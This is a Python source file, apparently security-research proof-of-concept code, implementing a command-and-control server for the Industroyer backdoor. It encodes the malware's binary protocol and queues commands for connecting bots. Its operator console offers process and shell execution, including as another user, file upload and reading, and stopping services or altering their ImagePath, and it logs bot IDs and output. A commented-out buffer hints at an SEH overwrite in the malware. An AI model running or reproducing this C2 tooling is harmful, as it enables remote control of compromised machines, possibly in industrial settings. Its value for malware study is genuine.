from flask import Flask, request
import struct
import sys
import logging
import threading

'''
    POC created by Adam Chester (@_xpn_) for Secarma Ltd
'''

# SEH overwrite Easter Egg... xD 
#buffer = "\x03\x00\x00\x00" + "\x00\x00\x10\x00" + "\xf8\x00\x00\x00" + "\x00\x00\x00\x00" + "A" * 0x100000 + "\x02\x00\x00\x00\x50\x00\x00\x00\x00\x00\x00\x00" + "\x05\x00\x00\x00\x08\x00\x00\x00\x08\x00\x00\x00\x09\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00" + "\x05\x00\x00\x00\x03\x00\x00\x00" + "\x05\x00\x00\x00\x01\x00\x00\x00" + "d\x00i\x00r\x00" + "\x00\x00" + "ABCDEFGHIJKLMNOP"

# Usual flask app
app = Flask(__name__)

# Disable logging to CLI from flask
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Queue for our outgoing commands
queue = []

# List of bots that we have seen
bots = []

class CommandThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def handle_file_upload(self, dest, filename):
        with open(filename, "r") as fd:
            contents = fd.read()
            queue.append(build_command(3, 1, dest, contents))

    def _getint(self, data):
        return struct.pack("I", data)

    def build_command(self, cmd, sleep, param1, param2):
    
        # Add our actual command
        cmdbuffer = "\x00\x00\x00\x00\x00\x00\x00\x00"                        # ??? (first DWORD)
        cmdbuffer += self._getint(cmd) + "\x00\x00\x00\x00"                   # Command ID
        cmdbuffer += param1.encode("UTF-16")[2:] + "\x00\x00"                 # Arg1
        cmdbuffer += param2.encode("UTF-16")[2:] + "\x00\x00"                 # Arg2

        # Add our command "header-header"       
        cmdheaderbuffer = "\x05\x00\x00\x00"                                  # Header count
        cmdheaderbuffer += "\x08\x00\x00\x00"                                 # ??? (first dword)
        cmdheaderbuffer += "\x08\x00\x00\x00"                                 # Command ID length
        cmdheaderbuffer += self._getint((len(param1) * 2) + 2)                # Arg1 length
        cmdheaderbuffer += self._getint((len(param2) * 2) + 2)                # Arg2 length (used for file upload)
        cmdheaderbuffer += "\x00\x00\x00\x00"                                 # NULL field


        # Header
        buffer  = "\x03\x00\x00\x00"                                          # Header count
        buffer += "\x04\x00\x00\x00"                                          # Sleep delay body length 
        buffer += self._getint(12 + len(cmdheaderbuffer) + len(cmdbuffer))    # Command length
        buffer += "\x00\x00\x00\x00"                                          # NULL field

        # Add sleep body
        buffer += self._getint(sleep)                                         # Sleep value (in seconds)
    
        # Add our command header
        buffer += "\x02\x00\x00\x00"                                          # Command header length
        buffer += self._getint(len(cmdheaderbuffer) + len(cmdbuffer))         # Command body length
        buffer += "\x00\x00\x00\x00"                                          # NULL field

        return buffer + cmdheaderbuffer + cmdbuffer

    def print_help(self):
        print "Industroyer Backdoor C2 POC"
        print "      by Adam Chester (@_xpn_) for Secarma Ltd"
        print ""
        print "Available commands:"
        print "1  - Execute a process"
        print "2  - Execute a process as another user"
        print "3  - Upload file from C2"
        print "4  - View file contents"
        print "5  - Execute a shell command"
        print "6  - Execute shell command as another user"
        print "7  - Quit"
        print "8  - Stop a service"
        print "9  - Stop a service as another user"
        print "10 - Start a service as another user"
        print "11 - Replace ImagePath for service"
        print "q  - Quit this shell"
        print "h  - Show this help"
        print ""
        print "Example: 1 C:\\windows\\system32\\calc.exe"
        print "Example: 5 Administrator password01 notepad.exe"
        print "Example: 3 /tmp/uploadme.txt C:\\uploaded.txt"
        print ""

    def run(self):
        data = ""

        self.print_help()

        while data != "q":
            data = raw_input("Indushell # ")

            if data.strip() != "":
                d = data.split(" ")

                if d[0] == "h":
                    # Handle help request
                    self.print_help()

                elif d[0] == "q":
                    # Handle quit
                    quit()

                elif int(d[0]) == 3:
                    # Handle file upload command
                    self.handle_file_upload(d[1], d[2])

                elif int(d[0]) >= 1 and int(d[0]) <= 11:
                    # Issue command to malware
                    queue.append(self.build_command(int(d[0]), 1, data[2:], ""))

                else:
                    # Print help
                    self.print_help()

def hexdump(data):
    for i in range(0,len(data)):
        if i % 16 == 0:
            sys.stdout.write("\n")

        sys.stdout.write("%02x " % ord(data[i]))

def parse_command_output(data):
    result = struct.unpack("II", data[0:8])
    return [result[1], data[8:]]

def parse_data(data):
    headers = []
    body = []
    command_output = []
    offset = 0

    #hexdump(data)

    # Parse the polling header
    (count,) = struct.unpack("I", data[:4])

    # Iterate through each header "length" value
    for i in range(1, count+1):
        (headerLen,) = struct.unpack("I", data[(i*4):(i*4)+4])
        headers.append(headerLen)

    offset = 4 + count * 4

    # Retrieve each value from the body
    for i in headers:
        body.append(data[offset : offset + i])
        offset += i

    # Check if end element is nested
    if headers[-1] != 0:
        command_output = parse_command_output(body[-1])

    return (body, command_output)


@app.route('/', methods=['POST'])
def handle_request():

    # Parse the incoming request
    data = parse_data(request.data)

    # Check if this is a polling request for a command
    if len(data[1]) == 0:

        # Check if we have seen this bot before
        if data[0][1] not in bots:

            # If not, show the connection message to the user
            print "Bot connection received: Machine ID [%s] Version [%s] Bot ID [%s]" % (data[0][0].decode('utf-16'), data[0][1], data[0][2].decode('utf-16'))
            bots.append(data[0][1])

    else:
        # As this is the command response, print the data to the user
        print data[1][1]

    if len(queue) != 0:

        # Issue a command from the queue during each poll
        command = queue.pop()
        return command #buffer

    else:
        return ""

if __name__ == '__main__':
    context = ('./ssl.crt', './ssl.key')
    CommandThread().start()
    app.run(debug=False, ssl_context=context, host="0.0.0.0", port=443)

